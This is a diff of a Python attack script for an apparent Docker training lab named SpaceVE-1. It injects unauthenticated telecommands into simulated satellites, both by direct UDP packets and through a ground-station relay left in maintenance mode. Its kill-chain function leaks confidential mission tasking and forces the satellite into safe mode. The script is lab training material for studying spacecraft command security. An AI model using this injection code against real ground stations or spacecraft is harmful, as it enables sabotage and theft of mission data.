@@ -1,215 +1,200 @@
 #!/usr/bin/env python3
 """
-command_injector.py — SpaceVE-1 Command Injection Tool
+command_injector.py -- SpaceVE-1 Command Injection Tool
 SpaceVE-1 Lab Attack Tool
 
-Demonstrates 3 command injection attack vectors against SpaceVE-1:
+Demonstrates 2 command injection attack vectors against SpaceVE-1:
 
-  Vector 1: Direct UDP injection to satellite (bypasses ground station entirely)
-  Vector 2: MOC unauthenticated API (/api/command/raw, no login required)
-  Vector 3: Ground station TCP relay (no source IP check)
+  Vector 1: Direct UDP to satellite (bypasses ground station)
+            Requires: run from inside Docker cmd network (192.168.61.0/24)
+            or via a container with cmd network access.
 
-This tool exercises all three misconfigurations in sequence and shows
-the satellite state change via MOC telemetry.
+  Vector 2: Ground station TCP relay via GS-BETA (MAINTENANCE_MODE, no auth)
+            Requires: docker compose up — GS-BETA exposed on localhost:4820.
 
 Usage:
-  python3 command_injector.py --attack udp
-  python3 command_injector.py --attack moc_api
   python3 command_injector.py --attack gs_relay
-  python3 command_injector.py --attack all
-  python3 command_injector.py --attack chain   (full kill chain)
+  python3 command_injector.py --attack gs_relay --cmd SAFING_MODE
+  python3 command_injector.py --attack udp --ip 192.168.61.100
+  python3 command_injector.py --attack chain
 
 Common Beginner Mistakes:
-  - Sending telemetry-type (type=0) packets instead of command-type (type=1)
-  - Wrong checksum: must XOR sec_byte0 with each user_data byte against 0xFF
-  - Forgetting the 4-byte length prefix on the TCP ground station protocol
-  - Checking MOC web UI before telemetry has had time to update (wait 2s)
+  - Direct UDP only works from inside the Docker cmd network (192.168.61.0/24).
+    From the host, use gs_relay (GS-BETA is exposed on localhost:4820).
+  - GS-BETA is in maintenance mode so no password is needed.
+  - Use the exact function names from LISTCMDS (uppercase).
 """
 
 import argparse
-import json
 import socket
 import struct
 import sys
 import time
 
-import requests
-
-SATELLITE_IP   = "192.168.60.100"
-SATELLITE_PORT = 1234
-MOC_IP         = "192.168.60.11"
-MOC_PORT       = 8080
-GS_IP          = "192.168.60.10"
-GS_PORT        = 4820
+# From host: GS-BETA is exposed on localhost:4820
+# From inside Docker cmd net: satellites are at 192.168.61.100/101/102
+GS_BETA_HOST   = "localhost"
+GS_BETA_PORT   = 4820
+SAT_IPS = {
+    "SpaceVE-1A": "192.168.61.100",
+    "SpaceVE-1B": "192.168.61.101",
+    "SpaceVE-1C": "192.168.61.102",
+}
+SAT_CMD_PORT   = 1234
 SATELLITE_APID = 0x200
 
 COMMANDS = {
-    "nop":         0x00,
-    "camera_on":   0x01,
-    "camera_off":  0x02,
-    "downlink_on": 0x03,
-    "downlink_off":0x04,
-    "memory_dump": 0x05,
-    "reboot":      0x06,
+    "NOP":                     0x00,
+    "CAMERA_ON":               0x01,
+    "CAMERA_OFF":              0x02,
+    "DOWNLINK_ENABLE":         0x03,
+    "DOWNLINK_DISABLE":        0x04,
+    "MEMORY_DUMP":             0x05,
+    "REBOOT":                  0x06,
+    "SAFING_MODE":             0x07,
+    "NOMINAL_MODE":            0x08,
+    "MISSION_DOWNLINK_ENABLE": 0x0B,
+    "MISSION_DOWNLINK_DISABLE":0x0C,
 }
 
-
-# ------------------------------------------------------------------
-# Packet builder
-# ------------------------------------------------------------------
-
-def build_ccsds(func_code: int, user_data: bytes = b"", seq: int = 0) -> bytes:
-    word0 = (0b000 << 13) | (1 << 12) | (1 << 11) | (SATELLITE_APID & 0x7FF)
-    word1 = (0b11 << 14) | (seq & 0x3FFF)
-    data_len = 1 + len(user_data)
-    primary = struct.pack(">HHH", word0, word1, data_len)
-    sec_byte0 = (func_code & 0x7F) << 1
-    cksum = 0xFF
-    cksum ^= sec_byte0
-    for b in user_data:
-        cksum ^= b
-    return primary + bytes([sec_byte0, cksum]) + user_data
+_seq = 0
 
 
-# ------------------------------------------------------------------
-# Attack vectors
-# ------------------------------------------------------------------
+def build_pus_tc(apid: int, fc: int) -> bytes:
+    """Build PUS-C TC[128,1] (13 bytes) matching satellite validate_ccsds."""
+    global _seq
+    _seq = (_seq + 1) & 0x3FFF
+    word0 = (1 << 12) | (1 << 11) | (apid & 0x7FF)
+    word1 = (0b11 << 14) | _seq
+    pus_ver_ack = 0x21
+    hdr = struct.pack(">BBBH", pus_ver_ack, 128, 1, 0x0001)
+    ck = 0xFF
+    for b in hdr:
+        ck ^= b
+    ck ^= fc
+    secondary = hdr + bytes([fc, ck])
+    return struct.pack(">HHH", word0, word1, len(secondary) - 1) + secondary
 
-def attack_udp(cmd: str = "downlink_on") -> bool:
-    """Vector 1: direct UDP injection to satellite — no auth, no source check."""
-    fc = COMMANDS.get(cmd, 0x03)
-    pkt = build_ccsds(fc)
-    print(f"  [UDP] Sending '{cmd}' (func=0x{fc:02X}) -> {SATELLITE_IP}:{SATELLITE_PORT}")
-    print(f"  [UDP] Packet: {pkt.hex()}")
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.sendto(pkt, (SATELLITE_IP, SATELLITE_PORT))
-    sock.close()
-    print(f"  [UDP] Sent. No authentication required.")
-    return True
 
-
-def attack_moc_api(cmd: str = "downlink_on") -> bool:
-    """Vector 2: MOC /api/command/raw — unauthenticated endpoint."""
-    fc = COMMANDS.get(cmd, 0x03)
-    pkt = build_ccsds(fc)
-    url = f"http://{MOC_IP}:{MOC_PORT}/api/command/raw"
-    payload = {"hex": pkt.hex(), "note": f"injected_{cmd}"}
-    print(f"  [MOC] POST {url}")
-    print(f"  [MOC] Payload: {payload}")
+def attack_udp(sat: str = "SpaceVE-1A", cmd: str = "DOWNLINK_ENABLE") -> bool:
+    """
+    Vector 1: direct UDP injection to satellite.
+    Only works from inside Docker spacelab-cmd network (192.168.61.0/24).
+    """
+    fc  = COMMANDS.get(cmd.upper())
+    if fc is None:
+        print(f"  [UDP] Unknown command '{cmd}'. Use --list to see options.")
+        return False
+    ip  = SAT_IPS.get(sat)
+    if not ip:
+        print(f"  [UDP] Unknown satellite '{sat}'")
+        return False
+    pkt = build_pus_tc(SATELLITE_APID, fc)
+    print(f"  [UDP] Sending '{cmd}' (FC=0x{fc:02X}) PUS-C TC -> {ip}:{SAT_CMD_PORT}")
+    print(f"  [UDP] Packet ({len(pkt)} bytes): {pkt.hex()}")
     try:
-        resp = requests.post(url, json=payload, timeout=5)
-        print(f"  [MOC] Response {resp.status_code}: {resp.text[:200]}")
-        return resp.status_code == 200
-    except requests.RequestException as e:
-        print(f"  [MOC] Error: {e}")
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.settimeout(2)
+        sock.sendto(pkt, (ip, SAT_CMD_PORT))
+        sock.close()
+        print(f"  [UDP] Sent. No authentication required.")
+        return True
+    except Exception as e:
+        print(f"  [UDP] Error: {e}")
+        print(f"  [UDP] Note: direct UDP only reachable from inside Docker cmd network.")
         return False
 
 
-def attack_gs_relay(cmd: str = "downlink_on") -> bool:
-    """Vector 3: ground station TCP relay — no source IP check."""
-    fc = COMMANDS.get(cmd, 0x03)
-    pkt = build_ccsds(fc)
-    length_prefix = struct.pack(">I", len(pkt))
-    full_msg = length_prefix + pkt
-    print(f"  [GS]  Connecting to {GS_IP}:{GS_PORT}")
-    print(f"  [GS]  Sending 4-byte length prefix ({len(pkt)}) + CCSDS packet")
+def attack_gs_relay(sat: str = "SpaceVE-1A", cmd: str = "DOWNLINK_ENABLE") -> bool:
+    """
+    Vector 2: GS-BETA text protocol relay.
+    GS-BETA runs in MAINTENANCE_MODE — no auth required (MC-GS-3).
+    Exposed on localhost:4820.
+    """
+    print(f"  [GS]  Connecting to GS-BETA at {GS_BETA_HOST}:{GS_BETA_PORT}")
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.settimeout(5)
-        sock.connect((GS_IP, GS_PORT))
-        sock.sendall(full_msg)
-        resp = sock.recv(1)
+        sock.connect((GS_BETA_HOST, GS_BETA_PORT))
+
+        banner = sock.recv(512).decode("utf-8", errors="replace")
+        if "MAINTENANCE" not in banner and "authentication" in banner.lower():
+            print(f"  [GS]  Unexpected: auth required. Banner: {banner[:120]}")
+            sock.close()
+            return False
+
+        line = f"SENDCMD {sat} {cmd.upper()}\n"
+        print(f"  [GS]  Sending: {line.strip()}")
+        sock.sendall(line.encode())
+        resp = sock.recv(256).decode("utf-8", errors="replace").strip()
         sock.close()
-        ok = resp == b"\x01"
-        print(f"  [GS]  Response: {'0x01 (forwarded)' if ok else '0x00 (error)'}")
+        ok = resp.startswith("OK")
+        print(f"  [GS]  Response: {resp}")
+        if ok:
+            print(f"  [GS]  Command relayed to satellite. No authentication was required.")
         return ok
+    except ConnectionRefusedError:
+        print(f"  [GS]  Connection refused. Is the lab running? (docker compose up -d)")
+        return False
     except Exception as e:
         print(f"  [GS]  Error: {e}")
         return False
 
 
-def check_telemetry() -> dict:
-    url = f"http://{MOC_IP}:{MOC_PORT}/api/telemetry"
-    try:
-        resp = requests.get(url, timeout=3)
-        return resp.json()
-    except Exception:
-        return {}
-
-
 def attack_chain():
-    """Full kill chain: recon -> inject -> confirm -> mission_plan exfil."""
-    print("\n  === SpaceVE-1 Full Attack Chain ===\n")
+    """Full kill chain: GS-BETA -> DOWNLINK_ENABLE -> MISSION_DOWNLINK_ENABLE."""
+    print("\n  === SpaceVE-1 Command Injection Chain ===\n")
 
-    # Step 1: Recon — pull telemetry without auth
-    print("  [Step 1] Unauthenticated telemetry recon")
-    tlm = check_telemetry()
-    print(f"  [Step 1] Satellite state: {json.dumps(tlm, indent=4)}")
+    print("  [Step 1] Enable downlink via GS-BETA (maintenance mode, no auth)")
+    ok = attack_gs_relay("SpaceVE-1A", "DOWNLINK_ENABLE")
     print()
+    if not ok:
+        print("  Chain aborted: could not reach GS-BETA.")
+        return
+    time.sleep(1)
 
-    # Step 2: Enable downlink via direct UDP
-    print("  [Step 2] Enable downlink (direct UDP injection)")
-    attack_udp("downlink_on")
-    print()
-    time.sleep(2)
-
-    # Step 3: Confirm via telemetry
-    print("  [Step 3] Confirm state change")
-    tlm = check_telemetry()
-    dl = tlm.get("downlink_enabled", False)
-    mp = tlm.get("mission_plan", {})
-    print(f"  [Step 3] downlink_enabled: {dl}")
-    if mp:
-        print(f"  [Step 3] mission_plan (EXFILTRATED): {json.dumps(mp, indent=4)}")
-    print()
-
-    # Step 4: Camera on via MOC unauthenticated API
-    print("  [Step 4] Enable camera via MOC unauthenticated API")
-    attack_moc_api("camera_on")
-    print()
-
-    # Step 5: Memory dump via ground station relay
-    print("  [Step 5] Memory dump via ground station relay")
-    attack_gs_relay("memory_dump")
+    print("  [Step 2] Enable mission data downlink (leaks CONFIDENTIAL tasking)")
+    attack_gs_relay("SpaceVE-1A", "MISSION_DOWNLINK_ENABLE")
     print()
     time.sleep(2)
 
-    # Step 6: Final state
-    print("  [Step 6] Final satellite state")
-    tlm = check_telemetry()
-    print(f"  {json.dumps(tlm, indent=4)}")
+    print("  [Step 3] Mission plan now flowing in WS TLM stream.")
+    print("  Connect to dashboard: http://localhost:8080")
+    print("  Or subscribe to ws://localhost:8765?token=<your_token>")
     print()
-    print("  === Chain complete. All attack surfaces exploited. ===\n")
 
+    print("  [Step 4] Put satellite into SAFE mode (mission impact)")
+    attack_gs_relay("SpaceVE-1A", "SAFING_MODE")
+    print()
+    print("  === Chain complete ===\n")
 
-# ------------------------------------------------------------------
-# Main
-# ------------------------------------------------------------------
 
 def main():
     p = argparse.ArgumentParser(description="SpaceVE-1 command injection tool")
-    p.add_argument("--attack", choices=["udp", "moc_api", "gs_relay", "all", "chain"],
+    p.add_argument("--attack", choices=["udp", "gs_relay", "chain", "list"],
                    default="chain")
-    p.add_argument("--cmd", default="downlink_on", choices=COMMANDS.keys(),
-                   help="Command to inject (for udp/moc_api/gs_relay modes)")
+    p.add_argument("--sat", default="SpaceVE-1A",
+                   choices=list(SAT_IPS.keys()),
+                   help="Target satellite")
+    p.add_argument("--cmd", default="DOWNLINK_ENABLE",
+                   help="Command name (use --attack list to see all)")
+    p.add_argument("--ip", default=None,
+                   help="Satellite IP for UDP mode (default: auto from --sat)")
     args = p.parse_args()
 
-    if args.attack == "udp":
+    if args.attack == "list":
+        print("\n  Available commands:")
+        for name, fc in COMMANDS.items():
+            print(f"    {name:<30} FC=0x{fc:02X}")
         print()
-        attack_udp(args.cmd)
-    elif args.attack == "moc_api":
+    elif args.attack == "udp":
         print()
-        attack_moc_api(args.cmd)
+        if args.ip:
+            SAT_IPS[args.sat] = args.ip
+        attack_udp(args.sat, args.cmd)
     elif args.attack == "gs_relay":
         print()
-        attack_gs_relay(args.cmd)
-    elif args.attack == "all":
-        print()
-        attack_udp(args.cmd)
-        print()
-        attack_moc_api(args.cmd)
-        print()
-        attack_gs_relay(args.cmd)
+        attack_gs_relay(args.sat, args.cmd)
     elif args.attack == "chain":
         attack_chain()
 
